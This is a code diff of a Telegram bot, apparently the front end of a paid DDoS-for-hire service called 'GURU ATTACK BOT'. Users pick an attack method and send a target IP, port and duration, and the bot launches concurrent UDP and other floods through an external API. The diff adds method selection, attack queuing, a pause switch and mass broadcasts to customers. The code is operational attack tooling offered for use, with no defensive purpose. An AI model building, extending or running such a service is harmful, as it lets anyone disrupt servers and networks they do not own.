+        f"💥 *SELECT ATTACK METHOD*\n\n"
+        f"Choose an attack method:\n\n"
+        f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION} seconds\n"
+        f"⚡ {MAX_CONCURRENT} concurrent attacks\n\n"
+        f"After selecting, send: `IP PORT TIME`\n"
+        f"Example: `91.108.17.41 32001 60`",
+        reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
     )
     context.user_data['awaiting_attack'] = True
+
+async def method_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    method = query.data.replace('method_', '')
+    context.user_data['attack_method'] = method
+    
+    await query.edit_message_text(
+        f"📡 *Method Selected: {method}*\n\n"
+        f"Send: `IP PORT TIME`\n"
+        f"Example: `91.108.17.41 32001 60`\n\n"
+        f"⚡ {MAX_CONCURRENT} concurrent {method} attacks!\n"
+        f"⏱️ Time: {MIN_DURATION}-{MAX_DURATION} seconds\n"
+        f"Send /cancel to cancel",
+        parse_mode='Markdown'
+    )
 
 async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not context.user_data.get('awaiting_attack'):
@@ -1155,6 +1680,11 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return
     
     user_id = update.effective_user.id
+    
+    if db.get_pause_status():
+        await update.message.reply_text("⏸️ Bot is paused!")
+        context.user_data['awaiting_attack'] = False
+        return
     
     plan, expiry = db.get_user_plan(user_id)
     is_admin = db.is_admin(user_id)
@@ -1188,23 +1718,36 @@ async def process_attack(update: Update, context: ContextTypes.DEFAULT_TYPE):
         port = int(parts[1])
         duration = int(parts[2])
         
+        method = context.user_data.get('attack_method', 'UDP')
+        
         if duration < MIN_DURATION or duration > MAX_DURATION:
             await update.message.reply_text(f"❌ Duration must be {MIN_DURATION}-{MAX_DURATION} seconds!")
             return
         
         can_start, msg = attack_manager.can_start_attack(user_id)
         if not can_start:
-            await update.message.reply_text(msg)
-            context.user_data['awaiting_attack'] = False
-            return
+            if "Global Cooldown" in msg:
+                attack_manager.add_to_queue(user_id, target, port, duration, method, context)
+                await update.message.reply_text(
+                    f"⏳ *Added to Queue*\n\n"
+                    f"{msg}\n\n"
+                    f"Your attack will start automatically.",
+                    parse_mode='Markdown'
+                )
+                context.user_data['awaiting_attack'] = False
+                return
+            else:
+                await update.message.reply_text(msg)
+                context.user_data['awaiting_attack'] = False
+                return
         
-        attack_id = attack_manager.start_attack(user_id, target, port, duration, "udp", 0)
+        attack_id = attack_manager.start_attack(user_id, target, port, duration, method, 0)
         
-        result = await send_concurrent_attacks(target, port, duration, user_id, context)
+        result = await send_concurrent_attacks(target, port, duration, user_id, context, method)
         
         if result:
             attack_info = db.log_attack(
-                user_id, target, port, duration, "udp",
+                user_id, target, port, duration, method,
                 "success" if result.get('success') else "failed",
                 str(result)
             )
@@ -1263,6 +1806,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 f"📅 Expires: {expiry.strftime('%Y-%m-%d %H:%M')}\n\n"
                 "📌 Features:\n"
                 f"• {MAX_CONCURRENT}x UDP Concurrent\n"
+                "• Multiple attack methods\n"
                 "• Unlimited attacks\n"
                 f"• Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
                 f"{cooldown_info}"
@@ -1274,6 +1818,7 @@ async def my_plan_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 "⏱️ Status: LIFETIME\n\n"
                 "📌 Features:\n"
                 f"• {MAX_CONCURRENT}x UDP Concurrent\n"
+                "• Multiple attack methods\n"
                 "• Unlimited attacks\n"
                 f"• Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
                 f"{cooldown_info}"
@@ -1317,9 +1862,12 @@ async def stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"⚡ Active Attacks: {stats['active']}/{stats['max']}\n"
         f"⚡ Attack Status: {attack_status}\n"
         f"⏳ Remaining: {stats['remaining']}s\n"
+        f"🌍 Global Cooldown: {stats['global_cooldown_remaining']}s\n"
+        f"⏳ Queue Size: {stats['queue_size']}\n"
         f"⚡ {MAX_CONCURRENT}x UDP: ENABLED\n"
         f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
-        f"🌐 Status: ONLINE"
+        f"📡 Methods: {len(ATTACK_METHODS)}\n"
+        f"🌐 Status: {'🟢 ONLINE' if not db.get_pause_status() else '⏸️ PAUSED'}"
     )
     
     await query.edit_message_text(
@@ -1343,6 +1891,8 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 LIST CODES", callback_data="admin_list")],
         [InlineKeyboardButton("🗑️ DELETE UNUSED CODE", callback_data="admin_delete")],
         [InlineKeyboardButton("🗑️ DELETE USED CODES", callback_data="admin_delete_used")],
+        [InlineKeyboardButton("📢 BROADCAST", callback_data="admin_broadcast")],
+        [InlineKeyboardButton("📊 BROADCAST HISTORY", callback_data="admin_broadcast_stats")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
@@ -1351,6 +1901,71 @@ async def admin_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         "⚙️ *ADMIN PANEL*\n\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard),
         parse_mode='Markdown'
+    )
+
+async def admin_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if not db.is_admin(user_id):
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    await query.edit_message_text(
+        "📢 *BROADCAST*\n\n"
+        "Send me the message you want to broadcast to all users.\n"
+        "You can send:\n"
+        "• Text message\n"
+        "• Photo (with caption)\n"
+        "• Video (with caption)\n\n"
+        "⚠️ *Warning:* This will send to ALL bot users!\n"
+        "Send /cancel to cancel.",
+        parse_mode='Markdown'
+    )
+    context.user_data['awaiting_broadcast'] = True
+
+async def admin_broadcast_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if not db.is_admin(user_id):
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    broadcasts = db.get_broadcast_stats()
+    
+    if not broadcasts:
+        await query.edit_message_text(
+            "📊 No broadcasts sent yet.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
+        )
+        return
+    
+    text = "📊 *Broadcast History*\n\n"
+    for b in broadcasts[:10]:
+        created_at = b.get('created_at', datetime.now())
+        if isinstance(created_at, datetime):
+            created_at_str = created_at.strftime('%Y-%m-%d %H:%M')
+        else:
+            created_at_str = str(created_at)
+        
+        media_type = b.get('media_type', 'text').upper()
+        total = b.get('total_users', 0)
+        successful = b.get('successful', 0)
+        failed = b.get('failed', 0)
+        success_rate = int((successful / total) * 100) if total > 0 else 0
+        
+        text += f"📅 {created_at_str}\n"
+        text += f"📎 Type: {media_type}\n"
+        text += f"👥 {successful}/{total} ({success_rate}%)\n"
+        text += f"❌ Failed: {failed}\n\n"
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="admin")]])
     )
 
 async def admin_gen_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -1591,6 +2206,9 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await query.answer("Access denied! Only Owner and Pseudo_Owner can access this.", show_alert=True)
         return
     
+    pause_status = db.get_pause_status()
+    pause_text = "⏸️ PAUSE BOT" if not pause_status else "▶️ UNPAUSE BOT"
+    
     keyboard = [
         [InlineKeyboardButton("👑 PROMOTE ADMIN", callback_data="owner_promote")],
         [InlineKeyboardButton("👑 DEMOTE ADMIN", callback_data="owner_demote")],
@@ -1599,14 +2217,163 @@ async def owner_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         [InlineKeyboardButton("📋 LIST ADMINS", callback_data="owner_list_admins")],
         [InlineKeyboardButton("📋 LIST USERS", callback_data="owner_list_users")],
         [InlineKeyboardButton("🚫 BANNED USERS", callback_data="owner_banned_users")],
+        [InlineKeyboardButton(pause_text, callback_data="owner_pause")],
+        [InlineKeyboardButton("📢 BROADCAST", callback_data="owner_broadcast")],
+        [InlineKeyboardButton("📊 BROADCAST HISTORY", callback_data="owner_broadcast_stats")],
         [InlineKeyboardButton("📊 STATS", callback_data="stats")],
         [InlineKeyboardButton("🔌 API STATUS", callback_data="owner_api_status")],
         [InlineKeyboardButton("🔙 BACK", callback_data="back")]
     ]
     
     await query.edit_message_text(
-        "👑 OWNER PANEL\n\nSelect action:",
+        f"👑 OWNER PANEL\n\nBot Status: {'⏸️ PAUSED' if pause_status else '🟢 ACTIVE'}\nSelect action:",
         reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+
+async def owner_pause_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Owner pause/unpause callback"""
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if not db.is_owner_or_pseudo(user_id):
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    current_pause = db.get_pause_status()
+    
+    if current_pause:
+        # Unpause
+        db.set_pause(False, user_id)
+        await query.edit_message_text(
+            "✅ *Bot Unpaused*\n\n"
+            "All users can now use the bot again!",
+            parse_mode='Markdown',
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
+        )
+        
+        # Notify admins
+        admins = db.get_admins()
+        for admin in admins:
+            try:
+                await context.bot.send_message(
+                    chat_id=admin['user_id'],
+                    text=f"✅ *Bot Unpaused*\n\nBy: `{user_id}`",
+                    parse_mode='Markdown'
+                )
+            except:
+                pass
+    else:
+        # Pause
+        await query.edit_message_text(
+            "⏸️ *PAUSE BOT*\n\n"
+            "Send a reason for pausing the bot:\n"
+            "Example: `Server maintenance`\n\n"
+            "Send /cancel to cancel.",
+            parse_mode='Markdown'
+        )
+        context.user_data['awaiting_pause_reason'] = True
+
+async def process_pause_reason(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if not context.user_data.get('awaiting_pause_reason'):
+        return
+    
+    if update.message.text.lower() == '/cancel':
+        context.user_data['awaiting_pause_reason'] = False
+        await update.message.reply_text("✅ Cancelled.")
+        return
+    
+    user_id = update.effective_user.id
+    reason = update.message.text
+    
+    db.set_pause(True, user_id, reason)
+    await update.message.reply_text(
+        f"⏸️ *Bot Paused*\n\n"
+        f"All users are now paused from using the bot.\n"
+        f"Reason: {reason}\n\n"
+        f"Use `/pause` or Owner Panel to unpause.",
+        parse_mode='Markdown'
+    )
+    
+    # Notify admins
+    admins = db.get_admins()
+    for admin in admins:
+        try:
+            await context.bot.send_message(
+                chat_id=admin['user_id'],
+                text=f"⏸️ *Bot Paused*\n\n"
+                     f"By: `{user_id}`\n"
+                     f"Reason: {reason}",
+                parse_mode='Markdown'
+            )
+        except:
+            pass
+    
+    context.user_data['awaiting_pause_reason'] = False
+
+async def owner_broadcast_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if not db.is_owner_or_pseudo(user_id):
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    await query.edit_message_text(
+        "📢 *BROADCAST*\n\n"
+        "Send me the message you want to broadcast to all users.\n"
+        "You can send:\n"
+        "• Text message\n"
+        "• Photo (with caption)\n"
+        "• Video (with caption)\n\n"
+        "⚠️ *Warning:* This will send to ALL bot users!\n"
+        "Send /cancel to cancel.",
+        parse_mode='Markdown'
+    )
+    context.user_data['awaiting_broadcast'] = True
+
+async def owner_broadcast_stats_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    
+    user_id = query.from_user.id
+    if not db.is_owner_or_pseudo(user_id):
+        await query.answer("Access denied!", show_alert=True)
+        return
+    
+    broadcasts = db.get_broadcast_stats()
+    
+    if not broadcasts:
+        await query.edit_message_text(
+            "📊 No broadcasts sent yet.",
+            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
+        )
+        return
+    
+    text = "📊 *Broadcast History*\n\n"
+    for b in broadcasts[:10]:
+        created_at = b.get('created_at', datetime.now())
+        if isinstance(created_at, datetime):
+            created_at_str = created_at.strftime('%Y-%m-%d %H:%M')
+        else:
+            created_at_str = str(created_at)
+        
+        media_type = b.get('media_type', 'text').upper()
+        total = b.get('total_users', 0)
+        successful = b.get('successful', 0)
+        failed = b.get('failed', 0)
+        success_rate = int((successful / total) * 100) if total > 0 else 0
+        
+        text += f"📅 {created_at_str}\n"
+        text += f"📎 Type: {media_type}\n"
+        text += f"👥 {successful}/{total} ({success_rate}%)\n"
+        text += f"❌ Failed: {failed}\n\n"
+    
+    await query.edit_message_text(
+        text,
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 BACK", callback_data="owner")]])
     )
 
 # ===== API STATUS =====
@@ -1628,7 +2395,8 @@ async def owner_api_status(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"{message}\n\n"
         f"📊 API Key: {'✅ Set' if API_KEY else '❌ Missing'}\n"
         f"📊 API URL: {os.getenv('API_URL', 'Not set')}\n"
-        f"🔄 Method: UDP\n"
+        f"🔄 Method: Multiple\n"
+        f"📡 Available: {', '.join(ATTACK_METHODS)}\n"
         f"⚡ Concurrent: {MAX_CONCURRENT}x\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
@@ -2080,13 +2848,16 @@ async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"👥 Users: {len(users)}\n"
         f"⚡ Attack Status: {attack_status}\n"
         f"⏳ Remaining: {stats['remaining']}s\n"
-        f"🎯 Method: UDP\n"
+        f"🌍 Global Cooldown: {stats['global_cooldown_remaining']}s\n"
+        f"⏳ Queue Size: {stats['queue_size']}\n"
+        f"🎯 Method: Multiple\n"
         f"⚡ {MAX_CONCURRENT}x Concurrent\n"
         f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s\n"
         f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s\n"
+        f"📡 Methods: {', '.join(ATTACK_METHODS)}\n"
         f"🔑 API: {'✅ Connected' if API_KEY else '❌ No Key'}\n"
-        f"🌐 Status: ONLINE\n\n"
-        f"📌 /attack IP PORT TIME",
+        f"🌐 Status: {'🟢 ONLINE' if not db.get_pause_status() else '⏸️ PAUSED'}\n\n"
+        f"📌 /attack IP PORT TIME [METHOD]",
         parse_mode='Markdown'
     )
 
@@ -2117,6 +2888,8 @@ async def back_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     welcome_back = f"👋 WELCOME BACK"
     if stats['is_running']:
         welcome_back += f"\n\n⚠️ Attack in progress by another user!\n⏳ Time remaining: {stats['remaining']}s"
+    if stats['global_cooldown_remaining'] > 0:
+        welcome_back += f"\n🌍 Global Cooldown: {stats['global_cooldown_remaining']}s"
     
     await query.edit_message_text(
         welcome_back,
@@ -2137,6 +2910,10 @@ async def message_router(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_ban(update, context)
     elif context.user_data.get('awaiting_unban'):
         await process_unban(update, context)
+    elif context.user_data.get('awaiting_broadcast'):
+        await process_broadcast(update, context)
+    elif context.user_data.get('awaiting_pause_reason'):
+        await process_pause_reason(update, context)
 
 # ===== RUN BOT =====
 application = None
@@ -2154,11 +2931,15 @@ def run_bot():
     app.add_handler(CommandHandler("attack", attack_command))
     app.add_handler(CommandHandler("redeem", redeem_command))
     app.add_handler(CommandHandler("status", status_command))
+    app.add_handler(CommandHandler("broadcast", broadcast_command))
+    app.add_handler(CommandHandler("broadcaststats", broadcast_stats))
+    app.add_handler(CommandHandler("pause", toggle_pause))
     app.add_handler(CommandHandler("cancel", cancel))
     
     # ===== CALLBACK QUERY HANDLERS =====
     # Main
     app.add_handler(CallbackQueryHandler(attack_callback, pattern="^attack$"))
+    app.add_handler(CallbackQueryHandler(method_callback, pattern="^method_"))
     app.add_handler(CallbackQueryHandler(my_plan_callback, pattern="^my_plan$"))
     app.add_handler(CallbackQueryHandler(stats_callback, pattern="^stats$"))
     app.add_handler(CallbackQueryHandler(back_callback, pattern="^back$"))
@@ -2170,6 +2951,8 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(admin_list_callback, pattern="^admin_list$"))
     app.add_handler(CallbackQueryHandler(admin_delete_callback, pattern="^admin_delete$"))
     app.add_handler(CallbackQueryHandler(admin_delete_used_callback, pattern="^admin_delete_used$"))
+    app.add_handler(CallbackQueryHandler(admin_broadcast_callback, pattern="^admin_broadcast$"))
+    app.add_handler(CallbackQueryHandler(admin_broadcast_stats_callback, pattern="^admin_broadcast_stats$"))
     
     # Delete handlers
     app.add_handler(CallbackQueryHandler(process_delete_unused_callback, pattern="^delunused_"))
@@ -2179,6 +2962,7 @@ def run_bot():
     
     # Owner
     app.add_handler(CallbackQueryHandler(owner_callback, pattern="^owner$"))
+    app.add_handler(CallbackQueryHandler(owner_pause_callback, pattern="^owner_pause$"))
     app.add_handler(CallbackQueryHandler(owner_promote_callback, pattern="^owner_promote$"))
     app.add_handler(CallbackQueryHandler(owner_demote_callback, pattern="^owner_demote$"))
     app.add_handler(CallbackQueryHandler(owner_ban_callback, pattern="^owner_ban$"))
@@ -2187,10 +2971,14 @@ def run_bot():
     app.add_handler(CallbackQueryHandler(owner_list_users_callback, pattern="^owner_list_users$"))
     app.add_handler(CallbackQueryHandler(owner_banned_users, pattern="^owner_banned_users$"))
     app.add_handler(CallbackQueryHandler(owner_api_status, pattern="^owner_api_status$"))
+    app.add_handler(CallbackQueryHandler(owner_broadcast_callback, pattern="^owner_broadcast$"))
+    app.add_handler(CallbackQueryHandler(owner_broadcast_stats_callback, pattern="^owner_broadcast_stats$"))
     app.add_handler(CallbackQueryHandler(process_demote, pattern="^demote_"))
     
     # ===== MESSAGE ROUTER =====
     app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, message_router))
+    app.add_handler(MessageHandler(filters.PHOTO & ~filters.COMMAND, message_router))
+    app.add_handler(MessageHandler(filters.VIDEO & ~filters.COMMAND, message_router))
     
     loop.run_until_complete(app.initialize())
     loop.run_until_complete(app.start())
@@ -2201,15 +2989,15 @@ def run_bot():
 
 if __name__ == "__main__":
     print("=" * 50)
-    print("👑 GURU ATTACK BOT - FIXED VERSION")
-    print(f"⚡ {MAX_CONCURRENT}x UDP CONCURRENT")
-    print("📌 API-ONLY - NO FALLBACK")
-    print("📌 Global Cooldown - One attack at a time")
+    print("👑 GURU ATTACK BOT - ULTIMATE VERSION")
+    print(f"⚡ {MAX_CONCURRENT}x CONCURRENT")
+    print("📌 Global Cooldown & Queue System")
     print(f"⏱️ Duration: {MIN_DURATION}-{MAX_DURATION}s")
-    print(f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s (Based on attack time)")
+    print(f"⏳ Cooldown: {MIN_COOLDOWN}-{MAX_COOLDOWN}s")
+    print("📡 Methods: " + ", ".join(ATTACK_METHODS))
     print("📌 Owner & Pseudo_Owner have equal powers")
-    print("📌 Live Time Updates in Bot DM")
-    print("📌 Real-time Alerts to Admins")
+    print("📌 Broadcast: Text, Photos, Videos")
+    print("📌 Pause/Resume for all members")
     print("=" * 50)
     
     bot_thread = threading.Thread(target=run_bot, daemon=True)
